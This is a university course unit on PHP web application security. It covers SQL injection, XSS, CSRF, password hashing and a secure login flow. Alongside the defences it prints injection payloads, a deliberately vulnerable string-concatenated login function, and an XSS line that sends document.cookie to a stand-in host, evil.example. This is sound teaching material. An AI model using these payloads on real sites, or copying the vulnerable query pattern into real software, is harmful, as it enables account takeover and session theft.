---
subject: Web Technology II
grade: BCA Semester 4
unit: 7
title: Web Application Security and Authentication
hours: 4
area: BCA 255 · Web Technology II · Unit 7
---

A web application is exposed to the whole Internet, and a login form is attacked within hours of going live. This unit (an addition to the old syllabus, standard in any modern server-side course) shows the most common attacks, each with a working demonstration, and the defence that stops it. The golden rule: **never trust input; escape on output; give users the least privilege.**

::: key What this unit gives you
- SQL injection, demonstrated against a real database, and prepared statements as the cure.
- Cross-site scripting (XSS) and `htmlspecialchars`; cross-site request forgery (CSRF) and tokens.
- Password hashing, a complete registration and login flow, session safety.
:::

## 7.1 SQL injection

If user input is pasted into SQL text, the input can change the structure of the query.

```php
<?php
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$db->exec("CREATE TABLE users (name TEXT, pass TEXT, role TEXT)");
$db->exec("INSERT INTO users VALUES ('admin', 's3cret', 'admin'), ('sita', 'pw1', 'user')");

function login_vulnerable(PDO $db, string $u, string $p): string {
    $sql = "SELECT role FROM users WHERE name = '$u' AND pass = '$p'";     // DANGEROUS
    $r = $db->query($sql)->fetch(PDO::FETCH_ASSOC);
    return $r ? "welcome, role=" . $r["role"] : "denied";
}
function login_safe(PDO $db, string $u, string $p): string {
    $st = $db->prepare("SELECT role FROM users WHERE name = :u AND pass = :p");
    $st->execute([":u" => $u, ":p" => $p]);
    $r = $st->fetch(PDO::FETCH_ASSOC);
    return $r ? "welcome, role=" . $r["role"] : "denied";
}
$attack = "admin' --";                              // everything after -- is a comment
echo "normal      : ", login_vulnerable($db, "sita", "pw1"), "\n";
echo "wrong pass  : ", login_vulnerable($db, "sita", "bad"), "\n";
echo "injection 1 : ", login_vulnerable($db, $attack, "anything"), "\n";
echo "injection 2 : ", login_vulnerable($db, "x", "' OR '1'='1"), "\n";
echo "safe version: ", login_safe($db, $attack, "anything"), " / ", login_safe($db, "x", "' OR '1'='1"), "\n";
echo "the query was: ", "SELECT role FROM users WHERE name = '$attack' AND pass = 'anything'", "\n";
```
```output
normal      : welcome, role=user
wrong pass  : denied
injection 1 : welcome, role=admin
injection 2 : welcome, role=admin
safe version: denied / denied
the query was: SELECT role FROM users WHERE name = 'admin' --' AND pass = 'anything'
```
(The demonstration uses an in-memory SQLite database so that it can be destroyed freely; MySQL behaves identically for these strings, with `-- ` followed by a space as the comment marker.) The attacker logged in as `admin` **without knowing the password**: the comment `--` removed the password check, and `' OR '1'='1` made the condition always true. Worse injections use `UNION SELECT` to read other tables or stacked statements to delete data.

**Defence:** prepared statements for *every* query with variable data (Unit 4); a database account with minimal privileges (no `DROP`, no access to other databases); validate types (cast IDs with `(int)`); generic error messages; keep software patched.

## 7.2 Cross-site scripting (XSS)

XSS happens when an application outputs user-supplied text into HTML without escaping, so the attacker's `<script>` runs in other users' browsers (stealing session cookies, changing the page). Types: **stored** (saved in the database, e.g. a comment), **reflected** (echoed from the URL) and **DOM-based**.

```php
<?php
$comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script> Nice site <b>!</b>';
echo "UNSAFE : <p>", $comment, "</p>\n";
echo "SAFE   : <p>", htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8"), "</p>\n";
$name = 'x" onmouseover="alert(1)';
echo '<input value="', htmlspecialchars($name, ENT_QUOTES), '">', "\n";
```
```output
UNSAFE : <p><script>fetch("https://evil.example/?c=" + document.cookie)</script> Nice site <b>!</b></p>
SAFE   : <p>&lt;script&gt;fetch(&quot;https://evil.example/?c=&quot; + document.cookie)&lt;/script&gt; Nice site &lt;b&gt;!&lt;/b&gt;</p>
<input value="x&quot; onmouseover=&quot;alert(1)">
```
**Defences:** escape on output with `htmlspecialchars($s, ENT_QUOTES, 'UTF-8')` in HTML text *and* attributes (a different escaping is needed inside JavaScript or URLs: use `json_encode` or `urlencode`); set the cookie flag `HttpOnly` so scripts cannot read the session cookie; send a **Content-Security-Policy** header; in JavaScript use `textContent` rather than `innerHTML`. Escaping on *output* beats trying to filter on input.

## 7.3 Cross-site request forgery (CSRF)

If you are logged in to your bank and visit a malicious page that silently submits a form to the bank's "transfer" URL, the browser attaches your cookie and the bank believes you did it. The defence is a secret, per-session **CSRF token** that the form carries and the server checks.

```php
<?php
ob_start(); session_save_path(sys_get_temp_dir()); session_id("csrf-demo-1"); session_start();
function csrf_token(): string {
    return $_SESSION["csrf"] ??= bin2hex(random_bytes(16));
}
function csrf_check(?string $sent): bool {
    return isset($_SESSION["csrf"]) && is_string($sent) && hash_equals($_SESSION["csrf"], $sent);
}
$token = csrf_token();
echo "token length: ", strlen($token), "\n";
echo "form field: ", '<input type="hidden" name="csrf" value="' . $token . '">', "\n";
echo "legitimate form accepted: ", var_export(csrf_check($token), true), "\n";
echo "forged request (no token): ", var_export(csrf_check(null), true), "\n";
echo "forged request (guessed token): ", var_export(csrf_check(str_repeat("0", 32)), true), "\n";
session_destroy(); ob_end_flush();
```
```output
token length: 32
form field: <input type="hidden" name="csrf" value="d5a6b199479c3403b0a3af4b9dee76fb">
legitimate form accepted: true
forged request (no token): false
forged request (guessed token): false
```
Also use `SameSite=Lax` (or `Strict`) cookies, and perform state-changing actions only with `POST`/`DELETE`, never `GET`.

## 7.4 Passwords: hashing, never encryption

Store only a **salted, slow hash** of the password, never the password. PHP provides `password_hash()` (bcrypt or Argon2 with an automatic random salt) and `password_verify()`.

```php
<?php
$hash = password_hash("nepal123", PASSWORD_BCRYPT, ["cost" => 10]);
echo "hash length: ", strlen($hash), " | starts with: ", substr($hash, 0, 7), "\n";
var_dump(password_verify("nepal123", $hash), password_verify("Nepal123", $hash));
$h2 = password_hash("nepal123", PASSWORD_BCRYPT, ["cost" => 10]);
var_dump($hash === $h2, password_verify("nepal123", $h2));
print_r(password_get_info($hash));
var_dump(password_needs_rehash($hash, PASSWORD_BCRYPT, ["cost" => 12]));
echo md5("nepal123") === md5("nepal123") ? "md5 is the same every time: do NOT use it for passwords\n" : "";
```
```output
hash length: 60 | starts with: $2y$10$
bool(true)
bool(false)
bool(false)
bool(true)
Array
(
    [algo] => 2y
    [algoName] => bcrypt
    [options] => Array
        (
            [cost] => 10
        )

)
bool(true)
md5 is the same every time: do NOT use it for passwords
```
The same password hashes to a **different string each time** (random salt), yet `password_verify` still accepts both. The string contains the algorithm, cost and salt (`$2y$10$…`), 60 characters, so use a `VARCHAR(255)` column. `md5` and `sha1` are fast and unsalted: attackers test billions per second (Operating Systems, Unit 8).

## 7.5 A complete registration and login flow

```php
<?php
ob_start(); session_save_path(sys_get_temp_dir()); session_id("login-demo-1"); session_start();
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
$db->exec("CREATE TABLE user (id INTEGER PRIMARY KEY, email TEXT UNIQUE NOT NULL, hash TEXT NOT NULL)");

function register(PDO $db, string $email, string $password): string {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) return "invalid e-mail";
    if (strlen($password) < 8) return "password too short";
    try {
        $db->prepare("INSERT INTO user (email, hash) VALUES (?, ?)")->execute([$email, password_hash($password, PASSWORD_DEFAULT)]);
        return "registered";
    } catch (PDOException $e) { return "e-mail already registered"; }
}
function login(PDO $db, string $email, string $password): string {
    $st = $db->prepare("SELECT id, hash FROM user WHERE email = ?"); $st->execute([$email]);
    $u = $st->fetch();
    if (!$u || !password_verify($password, $u["hash"])) return "invalid e-mail or password";   // same message for both cases
    session_regenerate_id(true);                        // prevents session fixation
    $_SESSION["user_id"] = $u["id"];
    return "logged in as user " . $u["id"];
}
echo register($db, "sita@tu.edu.np", "nepal2026!"), " | ", register($db, "sita@tu.edu.np", "other-pass"), " | ", register($db, "bad", "12345678"), " | ", register($db, "ram@tu.edu.np", "short"), "\n";
echo login($db, "sita@tu.edu.np", "wrong"), " | ", login($db, "nobody@x.com", "nepal2026!"), " | ", login($db, "sita@tu.edu.np", "nepal2026!"), "\n";
echo "protected page: ", isset($_SESSION["user_id"]) ? "allowed" : "redirect to login", "\n";
$_SESSION = []; session_destroy();
echo "after logout: ", isset($_SESSION["user_id"]) ? "allowed" : "redirect to login", "\n";
ob_end_flush();
```
```output
registered | e-mail already registered | invalid e-mail | password too short
invalid e-mail or password | invalid e-mail or password | logged in as user 1
protected page: allowed
after logout: redirect to login
```
Notes: the same error message for an unknown e-mail and a wrong password avoids revealing which e-mails exist; real systems also **rate-limit** attempts, use HTTPS, and offer password reset by e-mailed one-time link and two-factor authentication.

## 7.6 A security checklist

| Threat | Defence |
|---|---|
| SQL injection | prepared statements, least-privilege DB user |
| XSS | `htmlspecialchars` on output, `HttpOnly` cookies, CSP |
| CSRF | tokens, `SameSite` cookies, `POST` for changes |
| Weak passwords/storage | `password_hash`, minimum length, rate limit, 2FA |
| Session theft/fixation | HTTPS, `session_regenerate_id(true)` at login, `Secure` + `HttpOnly` |
| File upload abuse | check type and content, random name, no execution |
| Path traversal | `basename()`, whitelists |
| Information leaks | `display_errors=Off` in production, log errors |
| Outdated software | patch PHP and libraries; keep dependencies updated (Composer) |

## Formula and fact sheet

- Injection cure: prepared statements. XSS cure: `htmlspecialchars($s, ENT_QUOTES, "UTF-8")`.
- CSRF token: `bin2hex(random_bytes(16))` in the session and a hidden field, compared with `hash_equals`.
- Passwords: `password_hash` / `password_verify` (60-character bcrypt string, random salt).
- Login: `session_regenerate_id(true)`, generic error message, HTTPS.

## Chapter summary

- Injection, XSS and CSRF all come from trusting input; each has a standard defence.
- Passwords are stored as slow salted hashes; the login flow regenerates the session ID and reveals nothing about which part failed.
- Security is a checklist applied to every form, query and output, not a feature added at the end.

## Practice

1. Explain SQL injection with the string `' OR '1'='1` and give the fix.
2. What is stored XSS? Write the PHP statement that prevents it for a comment.
3. How does a CSRF token stop a forged request?
4. Why is `md5($password)` unsuitable for storing passwords?
5. Write registration and login functions using `password_hash` and `password_verify`.
6. Why should the login error message be the same for a wrong e-mail and a wrong password?
7. What does `session_regenerate_id(true)` protect against?

::: note Answers and worked solutions
**1.** In `... WHERE pass = '$p'`, the input `' OR '1'='1` turns the condition into `pass = '' OR '1'='1'`, always true, so login succeeds (Section 7.1 shows it). Fix: prepared statements.
**2.** Stored XSS: an attacker saves a comment containing `<script>`; it runs in every visitor's browser. Prevent it with `echo htmlspecialchars($comment, ENT_QUOTES, "UTF-8");` on output.
**3.** The server accepts a state-changing request only if it carries the secret token stored in the user's session. A forged request from another site cannot read or guess the token, so the check fails.
**4.** `md5` is fast and unsalted: billions of guesses per second, identical passwords give identical hashes (rainbow tables). `password_hash` is slow, salted and adjustable in cost.
**5.** See `register()` and `login()` in Section 7.5.
**6.** Different messages tell an attacker which e-mails are registered (**user enumeration**); one generic message reveals nothing.
**7.** **Session fixation**: an attacker plants a known session ID in the victim's browser before login; regenerating the ID at login makes the planted ID worthless.
:::
